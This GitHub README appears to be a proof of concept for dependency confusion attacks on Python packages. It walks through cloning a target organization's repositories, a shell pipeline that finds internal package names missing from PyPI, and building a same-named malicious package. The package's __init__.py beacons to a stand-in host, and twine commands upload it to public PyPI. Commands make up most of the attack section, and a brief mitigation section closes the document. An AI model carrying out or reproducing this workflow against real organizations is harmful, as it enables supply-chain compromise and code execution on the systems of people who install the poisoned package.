<h1 align="center">
    <a href="https://www.youtube.com/@techghoshal"><img src="https://github.com/techghoshal/Fix-Grub-Boot-Menu/assets/85815644/26ed3a3f-a1e6-452c-b2ac-cac5c3d7478e"></a>
<h1 align="center">Python Dependency Confusion Attacks POC
<p align="center"><img alt="Twitter Follow" src="https://img.shields.io/twitter/follow/techghoshal?style=social"></p>
</h1>

# Introduction

Dependency confusion is a supply chain vulnerability that arises when package managers inadvertently install malicious packages from public repositories instead of intended private ones. This issue is particularly prevalent in Python's package management system, where tools like `pip` may prioritize public packages over private ones if not properly configured. Exploiting this behavior can lead to severe consequences, including remote code execution (RCE) on target systems.

# Attack Overview

The typical workflow of a dependency confusion attack involves the following steps:

1. **Identifying Target Dependencies**: Attackers search for `requirements.txt` files in public repositories to identify internal package names used by organizations.

2. Verifying Package Availability: For each identified package, attackers check if it exists on the public Python Package Index [(PyPI)](https://pypi.org/). This can be automated using tools like `httpx` to detect 404 responses, indicating the package is absent from PyPI.

3. **Publishing Malicious Packages**: Attackers create and publish malicious packages on PyPI using the same names as the internal packages. These malicious packages can be designed to execute arbitrary code upon installation.

4. **Triggering Installation**: When the target organization installs dependencies without strict index configurations, `pip` may fetch the malicious package from PyPI, leading to code execution within the organization's environment.

# Proof of Concept (PoC)

The repository provides a PoC demonstrating this attack vector:

- **Cloning Target Repositories**: Utilize tools like [ghorg](https://github.com/gabrie30/ghorg) to clone all repositories from a target organization.

```bash
ghorg clone <target_organization> -t <personal_access_token>
```
- **Extracting Dependencies**: Search for `requirements.txt` files and extract package names.

```bash
find . -type f -name requirements.txt | \
xargs -n1 -I{} cat {} | \
sed 's/[><=~!].*//' | \
tr -d '[:space:]' | \
sort -u | \
xargs -I{} sh -c 'curl -s -o /dev/null -w "%{http_code} https://pypi.org/project/{}/\n" https://pypi.org/project/{}/' | \
grep "^404"
```
- **Creating Malicious Packages**: For each vulnerable package:
```bash
$ mkdir <package-name>
$ cd <package-name>
$ mkdir <package-name>
$ cd <package-name>
$ touch __init__.py
```
- **Insert malicious code into** `__init__.py`:
```bash
import requests
# Example: Send a request to a monitoring URL
requests.get("https://example.com/notify")
```
- Save this file and back `cd..` from the directory
- **Create** `setup.py` with appropriate metadata:

**Note**: The version of package and the version of the vulnerable package must be same
```bash
from setuptools import setup, find_packages

setup(
    name="<package-name>",
    version="0.0.1",
    author="Attacker Name",
    author_email="attacker@example.com",
    description="Malicious package for dependency confusion attack",
    packages=find_packages(),
    install_requires=['requests'],
)
```
- Build and upload the package to PyPI:
```bash
$ python3 setup.py sdist bdist_wheel
$ pip3 install twine
$ twine upload dist/*
```
# Mitigation Strategies

To protect against dependency confusion attacks:

- **Configure Package Indexes**: Use `--index-url` and `--extra-index-url` options in `pip` to prioritize private repositories over public ones.

- **Implement Package Scopes**: Employ tools like `pip`'s upcoming features (as per [PEP 708](https://peps.python.org/pep-0708/)) to define trusted sources for specific packages.

- **Monitor and Audit Dependencies**: Regularly scan dependencies for anomalies and ensure that all internal packages are also present in private repositories to prevent unauthorized public versions.

- **Use Dependency Management Tools**: Utilize tools like [Thoth](https://developers.redhat.com/articles/2021/12/21/prevent-python-dependency-confusion-attacks-thoth) to manage and resolve dependencies securely.

# Conclusion

Dependency confusion poses a significant risk to software supply chains. By understanding the attack vectors and implementing robust dependency management practices, organizations can mitigate the threat and secure their development environments.

### Connect me

If you have any queries, you can always contact me on [Linkedin](https://www.linkedin.com/in/anindyaghoshal/)
